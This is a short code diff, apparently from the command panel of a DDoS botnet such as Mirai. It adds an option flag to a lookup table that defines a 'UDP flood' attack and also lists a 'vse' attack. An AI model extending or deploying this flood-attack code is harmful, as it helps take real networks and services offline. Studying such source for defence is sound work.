@@ -140,7 +140,7 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
     "udp": AttackInfo {
         0,
-        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
+        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 23, 25 },
         "UDP flood",
     },
     "vse": AttackInfo {
